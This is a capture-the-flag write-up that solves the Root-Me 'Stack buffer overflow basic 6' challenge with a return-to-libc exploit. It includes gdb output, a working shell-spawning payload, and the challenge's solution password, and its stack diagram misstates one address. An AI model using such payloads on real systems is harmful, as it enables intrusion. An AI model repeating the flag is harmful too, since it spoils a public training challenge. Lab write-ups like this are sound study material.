# ELF x86 - Stack buffer overflow basic 6
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-6
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch33@challenge02.root-me.org    
Username	app-systeme-ch33
Password	app-systeme-ch33
```
According to the source code (and the executable itself), the program will get an argument (_message_) from the command line, and will print it.<br>
The _message_ buffer is 20 bytes long, and there is a use of **strcpy** with no boundary check.<br><br>

So first thing first, the offset which breaks the program need to be found. After few tries:
```gdb
(gdb) run `python -c "print 'A'*32 + 'DDDD'"`
Starting program: /challenge/app-systeme/ch33/ch33 `python -c "print 'A'*32 + 'DDDD'"`
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```

So it's possible to control the _eip_ from overflowing the buffer.<br>
Now, because the NX is on (and the program includes the "stdio.h") lets try to perform return-to-libc attack.<br>
First, let's find the libc's **system** function. According to gdb:
```gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e63310 <__libc_system>
```
Now, let's check if there is a "/bin/sh" string in libc (ASLR is off). According to gdb:
```gdb
(gdb) info proc map
process 6635
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33
	 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33
	 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33
	0xb7e22000 0xb7e23000     0x1000        0x0 
	0xb7e23000 0xb7fce000   0x1ab000        0x0 /lib/i386-linux-gnu/libc-2.19.so
	0xb7fce000 0xb7fd0000     0x2000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so
	0xb7fd0000 0xb7fd1000     0x1000   0x1ac000 /lib/i386-linux-gnu/libc-2.19.so
	0xb7fd1000 0xb7fd4000     0x3000        0x0 
	0xb7fdc000 0xb7fdd000     0x1000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e23000,0xb7fd1000,"/bin/sh"
0xb7f85d4c
1 pattern found.
```

So we've got control on the _eip_, the address to libc's **system** function and the address of a "/bin/sh" string.<br>
In order to exploit the program, the stack should look like the following:
```
          +-------------------+
          |                   |
          |    32 bytes for   |
          |    overflowing    |     <==== Junk
          |                   |
          +-------------------+
          |  system address   |     <==== '\x10\x33\xe6\xb7' = 0xb7e63310
          +-------------------+
          |  return address   |     <==== Junk (doesn't really matter because we are not interested in exiting cleanly)
          +-------------------+
          |    address to     |     <==== '\x4c\x5d\xf8\xb7' = 0xb7f8564c
          |    "/bin/sh"      |
          +-------------------+
```
After constructing the payload, the program gave the following output:
```sh
app-systeme-ch33@challenge02:~$ ./ch33 `python -c "print 'A'*32 + '\x10\x33\xe6\xb7' + 'DDDD' + '\x4c\x5d\xf8\xb7'"`
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3��DDDDL]��
$ id
uid=1133(app-systeme-ch33) gid=1133(app-systeme-ch33) euid=1233(app-systeme-ch33-cracked) groups=1233(app-systeme-ch33-cracked),100(users),1133(app-systeme-ch33)
$ cat .passwd
R3t2l1bcISnicet0o!
$ exit
Segmentation fault
```

Note: for exiting without segmentation fault, it's necessary to replace the 'DDDD' with a valid address (e.g address to libc's exit function).
